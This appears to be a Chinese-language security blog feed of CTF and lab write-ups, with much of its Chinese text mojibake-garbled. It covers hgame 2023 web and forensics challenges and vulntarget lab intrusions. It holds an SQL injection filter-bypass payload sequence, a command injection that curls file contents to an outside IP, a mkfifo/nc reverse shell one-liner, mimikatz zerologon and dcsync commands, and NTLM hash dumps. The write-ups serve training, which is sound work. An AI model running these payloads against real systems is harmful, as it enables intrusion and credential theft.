week-2.hgame.lwsec.cn_31248</span></span><br><span class="line"></span><br><span class="line">â”Œâ”€â”€(rootğŸ’€bohemian)-[/tools/GitHack/dist/week-<span class="number">2.</span>hgame.lwsec.cn_31248]</span><br><span class="line">â””â”€<span class="comment"># ls</span></span><br><span class="line">Th1s_1s-flag</span><br><span class="line"></span><br><span class="line">â”Œâ”€â”€(rootğŸ’€bohemian)-[/tools/GitHack/dist/week-<span class="number">2.</span>hgame.lwsec.cn_31248]</span><br><span class="line">â””â”€<span class="comment"># cat Th1s_1s-flag</span></span><br><span class="line">hgame&#123;Don<span class="string">&#x27;t^put*Git-in_web_directory&#125;</span></span><br></pre></td></tr></table></figure><h4 id="v2board"><a href="#v2board" class="headerlink" title="v2board"></a>v2board</h4><p><a href="https://www.youtube.com/watch?v=yfneS2R-Pn8&amp;ab_channel=%E4%B8%8D%E8%89%AF%E6%9E%97">https://www.youtube.com/watch?v=yfneS2R-Pn8&amp;ab_channel=%E4%B8%8D%E8%89%AF%E6%9E%97</a></p><h4 id="Search-Commodity"><a href="#Search-Commodity" class="headerlink" title="Search Commodity"></a>Search Commodity</h4><p>å¼±å£ä»¤ï¼Œçˆ†ç ´ä¸€ä¸‹</p><p><img src="/images/2023hgame%E9%83%A8%E5%88%86wp/image-20230213151310768.png" alt="image-20230213151310768"></p><p>user01<br>admin123</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">search_id=1  æ˜¾ç„¶æ³¨å…¥äº†</span><br><span class="line">search_id=1/**/order/**/by/**/1    //Error Occurred  ç©ºæ ¼è¢«è¿‡æ»¤ /**/</span><br><span class="line">search_id=1/*123*/order/*123*/by/*123*/1    //Error Occurred  /**/ è¢«è¿‡æ»¤ ç”¨/*123*/ æ›¿æ¢</span><br><span class="line">search_id=1/*123*/order/*123*/by/*123*/1    //Error Occurred</span><br><span class="line">//è¿™é‡Œè¯­å¥æ²¡æœ‰é—®é¢˜ï¼ŒçŒœæµ‹æ˜¯orè¢«è¿‡æ»¤äº†ï¼Œæˆ‘ä»¬åœ¨åŠ ä¸€ä¸ªor</span><br><span class="line">search_id=1/*123*/oorrder/*123*/by/*123*/1    //hard disk1</span><br><span class="line">//è¿™é‡Œoorrder æˆåŠŸï¼Œæˆ‘ä»¬å¯ä»¥çŒœæµ‹åå°æ˜¯å§oræ›¿æ¢ä¸ºç©ºäº†,</span><br><span class="line">æ³¨å‡º3ä¸ªå­—æ®µ</span><br><span class="line">search_id=-1/*1123*/union/*1123*/select/*2123*/2,3,4     //Error Occurred</span><br><span class="line">è¿™é‡ŒçŒœæµ‹æ˜¯union select æ›¿æ¢äº†ï¼Œå› ä¸ºä¸Šé¢ä¹Ÿoræ›¿æ¢äº†</span><br><span class="line">search_id=-1/*1123*/ununionion/*1123*/selselectect/*2123*/2,3,4</span><br><span class="line">or  å¤§å°å†™</span><br><span class="line">search_id=-1/*1123*/unIon/*1123*/seLect/*2123*/2,3,database() //Error Occurred</span><br><span class="line"></span><br><span class="line">search_id=-1/*1123*/unIon/*1123*/seLect/*2123*/2,Database(),4 //database  åŒå†™orå¤§å†™ //se4rch   4</span><br><span class="line"></span><br><span class="line">search_id=-1/*1123*/unIon/*1123*/seLect/*2123*/2,Group_concat(table_name)/*2123*/frOm/*2123*/infoorrmation_schema.tables/*2123*/whEre/*2123*/table_schema/*2123*/like/*2123*/&#x27;se4rch&#x27;</span><br><span class="line"></span><br><span class="line">è·å–è¡¨å</span><br><span class="line"></span><br><span class="line">search_id=-1/*1123*/unIon/*1123*/seLect/*2123*/2,datadatabasebase(),4</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="week3"><a href="#week3" class="headerlink" title="week3"></a>week3</h2><h3 id="web-2"><a href="#web-2" class="headerlink" title="web"></a>web</h3><h4 id="Ping-To-The-Host"><a href="#Ping-To-The-Host" class="headerlink" title="Ping To The Host"></a>Ping To The Host</h4><p>ping to host<br>æ— å›æ˜¾</p><p>vpsç›‘å¬ <code>nc -lkvvnp 7777</code></p><p>æœ‰è¿‡æ»¤  å¦‚æœä¸åŠ base64   ä¼šä¸æ˜¾ç¤º</p><p>ip=127.0.0.1%26%26curl%09<a href="http://182.92.176.62:7777/%60nl%09/f*|base64%60">http://182.92.176.62:7777/`nl%09/f*|base64`</a>  </p><p><img src="/images/2023hgame%E9%83%A8%E5%88%86wp/image-20230201105313163.png" alt="image-20230201105313163"></p><p>/ICAgICAxCWhnYW1le3AxbkdfdDBfQ29tTTRuRF9FeGVjVXQxb25fZEFuZ0VyUnJSclJyUiF9Cg==</p><h2 id="week4"><a href="#week4" class="headerlink" title="week4"></a>week4</h2><h3 id="web-3"><a href="#web-3" class="headerlink" title="web"></a>web</h3><h4 id="Tell-Me"><a href="#Tell-Me" class="headerlink" title="Tell Me"></a>Tell Me</h4><p>bind xxe</p><h3 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h3><h4 id="ezwin"><a href="#ezwin" class="headerlink" title="ezwin"></a>ezwin</h4><p>è¿™ä¸ªé¢˜æ¯”è¾ƒæœ‰æ„æ€äº†ï¼Œè¿™é‡ŒVolatility 3 å’ŒVolatility 2æœ‰æˆªç„¶ä¸åŒçš„ç»“æœï¼Œä¸æ˜¯å¾ˆç†è§£</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">â””â”€# python3 vol.py -f /tools/ctf/2023hgame/win10_22h2_19045.2486.vmem windows.envars.Envars | grep hgame</span><br><span class="line">3492resssihost.exe      0x222e2561bc0canHGAME_FLAGhed   hgame&#123;2109fbfd-a951-4cc3-b56e-f0832eb303e1&#125;</span><br><span class="line">3520    svchost.exe     0x1d2f6e033d0   HGAME_FLAG      hgame&#123;2109fbfd-a951-4cc3-b56e-f0832eb303e1&#125;</span><br><span class="line">3528    svchost.exe     0x163d90033d0   HGAME_FLAG      hgame&#123;2109fbfd-a951-4cc3-b56e-f0832eb303e1&#125;</span><br><span class="line">3668    taskhostw.exe   0x1ced6651bc0   HGAME_FLAG      hgame&#123;2109fbfd-a951-4cc3-b56e-f0832eb303e1&#125;</span><br><span class="line">3828    ctfmon.exe      0x1e2d9081bc0   HGAME_FLAG      hgame&#123;2109fbfd-a951-4cc3-b56e-f0832eb303e1&#125;</span><br><span class="line">3992    explorer.exe    0x1151bf0       HGAME_FLAG      hgame&#123;2109fbfd-a951-4cc3-b56e-</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">â”Œâ”€â”€(rootğŸ’€bohemian)-[/tools/volatility]</span><br><span class="line">â””â”€# python2 vol.py -f /tools/ctf/hgame/win10_22h2_19045.2486.vmem --profile=Win10x64_19041 envars | grep hgame</span><br><span class="line">Volatility Foundation Volatility Framework 2.6.1</span><br><span class="line">    3492 sihost.exe           0x00000222e2560fe0 HGAME_FLAG                     hgame&#123;2109fbfd-a951-4cc3-b56e-f0832eb303e1&#125;</span><br><span class="line">    3520 svchost.exe          0x000001d2f6e027f0 HGAME_FLAG                     hgame&#123;2109fbfd-a951-4cc3-b56e-f0832eb303e1&#125;</span><br><span class="line">    3528 svchost.exe          0x00000163d90027f0 HGAME_FLAG                     hgame&#123;2109fbfd-a951-4cc3-b56e-f0832eb303e1&#125;</span><br><span class="line">    3668 taskhostw.exe        0x000001ced6650fe0 HGAME_FLAG                     hgame&#123;2109fbfd-a951-4cc3-b56e-f0832eb303e1&#125;</span><br><span class="line">    3828 ctfmon.exe           0x000001e2d9080fe0 HGAME_FLAG                     hgame&#123;2109fbfd-a951-4cc3-b56e-f0832eb303e1&#125;</span><br><span class="line">    3992 explorer.exe         0x0000000006607a60 HGAME_FLAG                     hgame&#123;2109fbfd-a951-4cc3-b56e-f0832eb303e1&#125;</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">â”Œâ”€â”€(rootã‰¿Bohemian)-[/tools/volatility3]</span><br><span class="line">â””â”€<span class="comment"># python3 vol.py -f /tools/ctf/2023hgame/win10_22h2_19045.2486.vmem windows.hashdump</span></span><br><span class="line">Volatility 3 Framework 2.4.1</span><br><span class="line">Progress:  100.00               PDB scanning finished</span><br><span class="line">User    rid     lmhash  nthash</span><br><span class="line"></span><br><span class="line">Administrator   500     aad3b435b51404eeaad3b435b51404ee        31d6cfe0d16ae931b73c59d7e0c089c0</span><br><span class="line">Guest   501     aad3b435b51404eeaad3b435b51404ee        31d6cfe0d16ae931b73c59d7e0c089c0</span><br><span class="line">DefaultAccount  503     aad3b435b51404eeaad3b435b51404ee        31d6cfe0d16ae931b73c59d7e0c089c0</span><br><span class="line">WDAGUtilityAccount      504     aad3b435b51404eeaad3b435b51404ee        c4b2cf9cac4752fc9b030b8ebc6faac3</span><br><span class="line">Noname  1000    aad3b435b51404eeaad3b435b51404ee        84b0d9c9f830238933e7131d60ac6436</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">â”Œâ”€â”€(rootğŸ’€bohemian)-[/tools/volatility]</span><br><span class="line">â””â”€# python2 vol.py -f /tools/ctf/hgame/win10_22h2_19045.2486.vmem --profile=Win10x64_19041 hashdump</span><br><span class="line">Volatility Foundation Volatility Framework 2.6.1</span><br><span class="line">Administrator:500:6a21484f766d3766175c3a3f7763e688:b08b01ca485aea836bacb3aad6c45b26:::</span><br><span class="line">Guest:501:6a0af1d516e75dd696266273ce666e21:82e20e246547aa3ae431aec52f53cdf5:::</span><br><span class="line">DefaultAccount:503:ce2bccae5ac352b8e38c1d3194475940:4a947667f1ab4136246644fa344650b3:::</span><br><span class="line">WDAGUtilityAccount:504:efa88db8c9ac1b9f5798999b03241b90:611c4a5c71e01e167d8ef049135ff150:::</span><br><span class="line">Noname:1000:f4272abfe4b751256f7b4a0932246690:3454cf62689ec53e97581f7a3312c3a9:::</span><br></pre></td></tr></table></figure><p>volatility 2 filescan æ—¶æˆ‘ä»¬å¯ä»¥çœ‹åˆ°æœ‰ä¸ªflag.7z é¢˜ç›®æç¤ºä¹Ÿç»™äº†ï¼Œè¿™é‡Œdumpfilesæ—¶ -q æå–ä¸æ¥ä¸œè¥¿ï¼Œ</p><p>ä½†æ˜¯å¯ä»¥-pid æ‰¾åˆ°å‹ç¼©æ–‡ä»¶çš„è¿›ç¨‹å·ï¼Œè¿™æ ·ä¼šæå–å‡ºæ¥ä¸€ä¸‹æ— å…³çš„æ–‡ä»¶ï¼Œå†™ä¸ªç®€å•è„šæœ¬ çœ‹çœ‹é‚£ä¸ªæ˜¯zip</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="keyword">for</span> file <span class="keyword">in</span> ./*</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">        file <span class="variable">$file</span></span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure><p><img src="/images/2023hgame%E9%83%A8%E5%88%86wp/image-20230216150417789.png" alt="image-20230216150417789"></p><p>å¯ä»¥çœ‹åˆ°ä¸¤ä¸ª7-zipæ–‡ä»¶ï¼Œæ‹–åˆ°winä¸‹  ç„¶åè§£ä¸€ä¸‹</p><p><img src="/images/2023hgame%E9%83%A8%E5%88%86wp/image-20230216151102965.png" alt="image-20230216151102965"></p><p>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°è¿™ä¸ª6270çš„datæ–‡ä»¶å¯ä»¥è§£å‹å‡ºæ¥ä¸œè¥¿ï¼Œä½†æ˜¯å‘¢ï¼Œè¿™ä¸ªtxtè¢«wannarenåŠ å¯†äº†ï¼Œç»è¿‡æœç´¢ï¼Œç«ç»’æœ‰ä¸€ä¸ªå¯ä»¥è§£å¯†çš„è½¯ä»¶</p><p><img src="/images/2023hgame%E9%83%A8%E5%88%86wp/image-20230216152439725.png" alt="image-20230216152439725"></p><p>æ–°ä½›æ›°ï¼Œè§£å‡ºæ¥æäº¤å‘ç°ä¸å¯¹ï¼Œé—®äº†ä¸€ä¸‹å‡ºé¢˜äººï¼Œå‘ç°ä¸å¯¹ï¼Œè¯´è¦ç”¨volatility 3ï¼Œé¢˜ç›®å…¶å®ä¹Ÿæç¤ºäº†è¦ç”¨ä¸‰ï¼Œå½“æ—¶æœºå™¨æ²¡æœ‰ä¸‰ï¼Œæˆ‘å°±ç”¨ä¸‰é‡æ–°åšä¸€éï¼Œä¸€æ ·çš„æ­¥éª¤ï¼Œæå‡ºæ¥çš„å°±ä¸è¦ä¸€æ ·ã€‚åæ¥æˆ‘å»æœäº†è¿™ä¸ªæ–°ä½›æ›°çš„ç ï¼Œå‘ç°æ˜¯2022å¹´çš„é¢˜ã€‚åŒä¸€ä¸ªç¯å¢ƒä½†æ˜¯æå‡ºæ¥çš„å‹ç¼©åŒ…ä¸ä¸€æ ·ï¼Œä¸å¤ªæ¸…æ¥šã€‚</p><p>ç”¨volatility 3ä»æ–°åšä¸€ä¸‹ï¼Œ</p><p>python3 vol.py -f /tools/ctf/2023hgame/win10_22h2_19045.2486.vmem windows.dumpfiles â€“pid 7584</p><p>è¿™é‡Œæˆ‘ä½¿ç”¨è¿™ä¸ªå‘½ä»¤æçš„ï¼Œè¿™æ ·ä¼šæå‡ºæ¥ä¸€å¤§å †æ–‡ä»¶ï¼ŒåŒæ ·ç”¨è„šæœ¬åˆ¤æ–­ä¸€ä¸‹é‚£ä¸ªzip,è¿™ä¸ªæ ¹æ®åå­—ä¹Ÿèƒ½å¤§æ¦‚çŒœå‡º</p><p>file.0xd00641b5ba70.0xd00641180e30.DataSectionObject.flag.7z.dat</p><p><img src="/images/2023hgame%E9%83%A8%E5%88%86wp/image-20230216153755607.png" alt="image-20230216153755607"></p><p>æ‰“å¼€å¯ä»¥çœ‹åˆ°å¯†ç æ˜¯è§£å‡ºæ¥hash</p><p>84b0d9c9f830238933e7131d60ac6436</p><p>æŸ¥è¯¢ç»“æœï¼š asdqwe123</p><p>å°±å¯ä»¥äº†</p><h4 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h4><blockquote><p>ä¸€ç›´åœ¨è·¯ä¸Š</p></blockquote>]]></content>
      
      
      
        <tags>
            
            <tag> misc </tag>
            
            <tag> PWN </tag>
            
            <tag> Volatility </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2022å¼±å£ä»¤å®‰å…¨å®éªŒå®¤æ‹›æ–°èµ›-é¶æœºæŒ‘æˆ˜</title>
      <link href="/2023/01/05/CTFS/2022%E5%BC%B1%E5%8F%A3%E4%BB%A4%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C%E5%AE%A4%E6%8B%9B%E6%96%B0%E8%B5%9B-%E9%9D%B6%E6%9C%BA%E6%8C%91%E6%88%98/"/>
      <url>/2023/01/05/CTFS/2022%E5%BC%B1%E5%8F%A3%E4%BB%A4%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C%E5%AE%A4%E6%8B%9B%E6%96%B0%E8%B5%9B-%E9%9D%B6%E6%9C%BA%E6%8C%91%E6%88%98/</url>
      
        <content type="html"><![CDATA[<p><img src="C:\Users\xin\AppData\Roaming\Typora\typora-user-images\image-20230105144545334.png" alt="image-20230105144545334"></p><p><img src="C:\Users\xin\AppData\Roaming\Typora\typora-user-images\image-20230105144556972.png" alt="image-20230105144556972"></p><p><a href="https://www.iculture.cc/rce/">https://www.iculture.cc/rce/</a></p><p>rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2&gt;&amp;1|nc 192.168.144.128 9990 &gt;/tmp/f</p><p><img src="C:\Users\xin\AppData\Roaming\Typora\typora-user-images\image-20230105145002174.png" alt="image-20230105145002174"></p><p>setg Proxies socks5:192.168.144.128:1080 #è®¾ç½®å…¨å±€ä»£ç†<br>set ReverseAllowProxy true #è¿™ä¸ªå‚æ•°æ˜¯å› ä¸ºä½¿ç”¨å…¨å±€ä»£ç†ï¼Œå¯èƒ½ä¼šå¯¼è‡´æˆ‘ä»¬çš„shellæ— æ³•åå¼¹ï¼Œæ‰€ä»¥éœ€è¦å¼€å¯ã€‚</p><p>setg Proxies socks5:192.168.144.136:8888 #è®¾ç½®å…¨å±€ä»£ç†<br>set ReverseAllowProxy true #è¿™ä¸ªå‚æ•°æ˜¯å› ä¸ºä½¿ç”¨å…¨å±€ä»£ç†ï¼Œå¯èƒ½ä¼šå¯¼è‡´æˆ‘ä»¬çš„shellæ— æ³•åå¼¹ï¼Œæ‰€ä»¥éœ€è¦å¼€å¯ã€‚</p><p>:&gt;fscan.exe -h 192.168.48.1/24<br>fscan.exe -h 192.168.48.1/24</p><hr><p>  / _ \     ___  ___ _ __ __ _  <em><strong>| | __<br> / /<em>/</em></strong></em>/ __|/ <strong>| â€˜</strong>/ <em>` |/ <strong>| |/ /<br>/ /<em>\_</em></strong></em>__ \ (<strong>| | | (_| | (</strong>|   &lt;<br>____/     |___/___|_|  __,_|___|_|_<br>                     fscan version: 1.6.3<br>start infoscan<br>(icmp) Target â€˜192.168.48.128â€™ is alive<br>(icmp) Target â€˜192.168.48.200â€™ is alive<br>icmp alive hosts len is: 2<br>192.168.48.200:139 open<br>192.168.48.128:139 open<br>192.168.48.128:88 open<br>192.168.48.200:445 open<br>192.168.48.128:445 open<br>192.168.48.200:135 open<br>192.168.48.128:135 open<br>alive ports len is: 7<br>start vulscan<br>[+] 192.168.48.200      MS17-010        (Windows Server 2008 R2 Datacenter 7600)<br>[<em>] 192.168.48.200       WEAK\WIN-S96L5Q5A734   Windows Server 2008 R2 Datacenter 7600<br>NetInfo:<br>[*]192.168.48.128<br>   [-&gt;]WIN-JK2FG246GEF<br>   [-&gt;]192.168.48.128<br>[</em>] 192.168.48.128 [+]DC WEAK\WIN-JK2FG246GEF   Windows Server 2008 R2 Datacenter 7600<br>[+] 192.168.48.128      MS17-010        (Windows Server 2008 R2 Datacenter 7600)<br>å·²å®Œæˆ 9/9<br>scan end</p><p>WIN-JK2FG246GEF$</p><p>kiwi_cmd â€œlsadump::zerologon /target:192.168.48.128 /account:WIN-JK2FG246GEF$â€ exit</p><p>mimikatz.exe â€œlsadump::zerologon /target:192.168.48.128 /account:DC01$â€ exit</p><p>kiwi_cmd â€œlsadump::dcsync /domain:WEAK.COM /dc:WIN-JK2FG246GEF.WEAK.COM /user:administrator /authuser:WIN-JK2FG246GEF$ /authdomain:WEAK /authpassword: /authntlmâ€</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>vulntarget-c</title>
      <link href="/2022/11/29/vulntarget-c/"/>
      <url>/2022/11/29/vulntarget-c/</url>
      
        <content type="html"><![CDATA[<h3 id="ç¯å¢ƒ"><a href="#ç¯å¢ƒ" class="headerlink" title="ç¯å¢ƒ"></a>ç¯å¢ƒ</h3><p>ç›¸å…³æ¼æ´æŠ€æœ¯ï¼šlaravelã€OVAS-PHPç›¸å…³æ¼æ´ã€éš§é“ä»£ç†ã€å…æ€ã€ææƒã€CVE-2021-3129<br>ã€CVE-2021-3493ç­‰<br>ä¸‹è½½åœ°å€ï¼š<br>ç™¾åº¦äº‘é“¾æ¥:<br><a href="https://pan.baidu.com/s/1p3GDd7V3Unmq3-wSAvl7_Q">https://pan.baidu.com/s/1p3GDd7V3Unmq3-wSAvl7_Q</a><br>æå–ç : 1p9p</p><p>å…¶ä¸­vulntarget-cæ˜¯æœ¬æ¬¡ç¯å¢ƒ</p><p>githubåœ°å€ï¼š</p><p><a href="https://github.com/crow821/vulntarget">https://github.com/crow821/vulntarget</a></p><h4 id="æ‹“æ‰‘å›¾"><a href="#æ‹“æ‰‘å›¾" class="headerlink" title="æ‹“æ‰‘å›¾"></a>æ‹“æ‰‘å›¾</h4><p><img src="/images/vulntarget-e/image-20221129102253692.png" alt="image-20221129102253692"></p><h4 id="vmç½‘å¡é…ç½®"><a href="#vmç½‘å¡é…ç½®" class="headerlink" title="vmç½‘å¡é…ç½®"></a>vmç½‘å¡é…ç½®</h4><p>å°†ç™¾åº¦ç½‘ç›˜çš„é¶åœºcä¸‹è½½ä¸‹æ¥ï¼Œä½¿ç”¨vmæ‰“å¼€ï¼Œæˆ‘ä»¬å…ˆç¼–è¾‘ä¸€ä¸‹è™šæ‹Ÿç½‘å¡ç½‘æ®µ</p><p><img src="/images/vulntarget-e/image-20221129102606686.png" alt="image-20221129102606686"></p><p>è¿™é‡Œè¦æ³¨æ„ä¸å‹¾é€‰å°†ä¸»æœºè™šæ‹Ÿè¿æ¥åˆ°æ­¤ç½‘ç»œï¼Œå¦‚æœå‹¾é€‰çš„è¯ï¼Œä½ ä¼šå‘ç°ï¼Œæˆ‘ä»¬ç›´æ¥èƒ½ä»ä¸»æœºpingåˆ°10ï¼Œ20æ®µï¼Œè¿™æ ·å°±ä¸æ˜¯å†…ç½‘äº†ã€‚</p><p>ç¬¬ä¸€å°æ˜¯ubuntu20</p><p><img src="/images/vulntarget-e/image-20221129102818958.png" alt="image-20221129102818958"></p><p>ç¬¬äºŒå°win2016</p><p><img src="/images/vulntarget-e/image-20221129102845711.png" alt="image-20221129102845711"></p><p>ç¬¬ä¸‰å°ubuntu16</p><p><img src="/images/vulntarget-e/image-20221129102914418.png" alt="image-20221129102914418"></p><p>è®¾ç½®å¥½ä¹‹åå¼€æœºï¼Œä½†æ˜¯è¿˜æ˜¯æœ‰ä¸€ç‚¹é—®é¢˜ï¼Œé»˜è®¤ä½œè€…é…ç½®çš„æ—¶å€™ç»™åˆ°çš„æ˜¯é™æ€ip30æ®µçš„ï¼Œæˆ‘ä»¬éœ€è¦æ”¹ä¸€ä¸‹ï¼Œæˆ‘è¿™è¾¹netæ˜¯144æ®µçš„ï¼Œæ‰€ä»¥æˆ‘ä»¬ç»™ç½‘å¡ä¸€ä¸ª144æ®µçš„é™æ€IPå°±å¯ä»¥äº†</p><p><code>è´¦å¯†1ï¼švulntarget/root</code><br><code>è´¦å¯†2ï¼šroot/root#qwe</code></p><p>ç”¨rootè´¦å·ç™»å½•ä¸€ä¸‹ï¼Œæ”¹æ‰ç½‘å¡é…ç½®</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">su</span><br><span class="line">root<span class="comment">#qwe</span></span><br><span class="line">vim /etc/netplan/00-installer-config.yaml <span class="comment">#ç¼–è¾‘ç½‘å¡é…ç½®æ–‡ä»¶</span></span><br><span class="line">:wq</span><br><span class="line">netplan apply <span class="comment">#é‡å¯ç½‘å¡</span></span><br></pre></td></tr></table></figure><p><img src="/images/vulntarget-e/image-20221129103520466.png" alt="image-20221129103520466"></p><p><img src="/images/vulntarget-e/image-20221129103635589.png" alt="image-20221129103635589"></p><p>è¿™é‡Œæ³¨æ„ç½‘å…³ä¹Ÿæ”¹ä¸€ä¸‹ï¼Œå½“ç„¶è¿™é‡Œç½‘å¡ä¸å”¯ä¸€ï¼Œæˆ‘è¿™æ ·åé¢æ¯”è¾ƒç®€å•ä¸éœ€è¦æ”¹ç½‘å¡é…ç½®æ–‡ä»¶äº†</p><p>æˆ‘ä»¬ç®€å•æ‰«ä¸€ä¸‹<img src="/images/vulntarget-e/image-20221129104349743.png" alt="image-20221129104349743"></p><p>å¯ä»¥çœ‹åˆ°55çš„ipå¼€ç€80å’Œ22ï¼Œè®¿é—®ä¸€ä¸‹</p><p><img src="/images/vulntarget-e/image-20221129104507816.png" alt="image-20221129104507816"></p><p>è‡³æ­¤åœ¨vmä¸Šç¯å¢ƒæ­å»ºå·²ç»å®Œæˆ</p><h3 id="laravelæ¸—é€-CVE-2021-3129"><a href="#laravelæ¸—é€-CVE-2021-3129" class="headerlink" title="laravelæ¸—é€-CVE-2021-3129"></a>laravelæ¸—é€-CVE-2021-3129</h3><p>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°æ˜¯ä¸€ä¸ªlaravelçš„æ¡†æ¶ç½‘ç«™ï¼Œæ—¢ç„¶é¶åœºï¼Œé‚£è‚¯å®šå­˜åœ¨æ¼æ´ï¼Œåœ¨å³ä¸‹è§’æˆ‘ä»¬ä¹Ÿå¯ä»¥çœ‹åˆ°Laravel v8.78.1 (PHP v7.4.3)ï¼Œé‚£è‚¯å®šæ˜¯å¤ç°laravelå†å²æ¼æ´äº†ã€‚ç½‘ä¸Šæœä¸€ä¸‹ç‰ˆæœ¬å·ï¼Œ(å¯ä»¥çœ‹åˆ°å…¶ä»–ä½¬å‘çš„è¿™ä¸ªé¶åœºwpï¼Œç¡®å®šCVE-2021-3129),å‘ç°æ˜¯2021-3129ï¼Œåæ­£æˆ‘æ˜¯æ²¡æœ‰å‘ç°ï¼Œå› ä¸ºçœ‹æ–‡ç« éƒ½æ˜¯è¯´å½±å“ç‰ˆæœ¬åœ¨Laravel&lt;=8.4.2,<code>https://www.freebuf.com/vuls/280508.html</code>,ä½†æ˜¯é¶æœºç¯å¢ƒåœ¨8.78ï¼Œä¹Ÿæœ‰å¯èƒ½æ˜¯ï¼Œ<code>Ignitionï¼ˆ&lt;=2.5.1ï¼‰</code>,è¿™ä¸ªæ’ä»¶çš„ç‰ˆæœ¬çš„é—®é¢˜ï¼Œè¿™ä¸ªæ–‡ç« è¯´çš„ï¼Œ<code>https://mp.weixin.qq.com/s/k08P2Uij_4ds35FxE2eh0g</code><br>emmmmå°±å½“å‘ç°äº†å§ã€‚æˆ‘ä»¬å»å¤ç°ä¸€ä¸‹ã€‚</p><p>é¦–å…ˆè‚¯å®šæ˜¯githubæ‰¾å„ç§pocï¼Œæˆ‘ä¹Ÿæ‰¾äº†å„ç§pocï¼Œéƒ½æ‰“äº†ä¸€éï¼Œemmmmï¼Œéƒ½æ²¡æ‰“é€šï¼Œä¸æ˜¯phpæŠ¥é”™å°±æ˜¯not fund rce ï¼Œå¯èƒ½æ˜¯kaliçš„é—®é¢˜ï¼Œæ²¡æœ‰å»å…¶ä»–ç³»ç»Ÿæµ‹è¯•ï¼Œæœ‰å…´è¶£çš„å°ä¼™ä¼´æµ‹è¯•ä¸€ä¸‹ã€‚</p><p><code>http://wiki.peiqi.tech/wiki/frame/Laravel/Laravel%20Debug%E6%A8%A1%E5%BC%8F%20_ignition%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20CVE-2021-3129.html</code><br><code>https://github.com/SNCKER/CVE-2021-3129</code><br><code>https://github.com/SecPros-Team/laravel-CVE-2021-3129-EXP</code></p><p><img src="/images/vulntarget-e/image-20221129174149286.png" alt="image-20221129174149286"></p><p><img src="/images/vulntarget-e/image-20221129174203408.png" alt="image-20221129174203408"></p><p>è¿™å‡ ä¸ªpocéƒ½è¯•äº†ä¸€ä¸‹ï¼Œæ²¡æœ‰æ‰“é€šï¼Œæ²¡æœ‰å…³ç³»ï¼Œæˆ‘ä»¬æ‰‹å·¥å¤ç°ä¸€ä¸‹ã€‚<br>å‚è€ƒä¸‹é¢è¿™ç¯‡æ–‡ç« </p><p><code>https://www.freebuf.com/vuls/280508.html</code><br>å…·ä½“åŸç†è¿™é‡Œå°±ä¸èµ˜è¿°äº†ï¼Œç›´æ¥æ‰“</p><p>å…ˆè®¿é—®ç½‘ç«™ï¼ŒæŠ“åŒ…ï¼Œç„¶åæˆ‘ä»¬å¯ä»¥çœ‹åˆ°åŒ…é‡Œæœ‰è®¸å¤šå†…å®¹ï¼ŒæŠŠä¸‹é¢çš„åˆ æ‰ï¼Œç„¶ååªç•™å››è¡Œ</p><p><img src="/images/vulntarget-e/image-20221129175857744.png" alt="image-20221129175857744"></p><p><img src="/images/vulntarget-e/image-20221129180059768.png" alt="image-20221129180059768"></p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/_ignition/execute-solution</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span 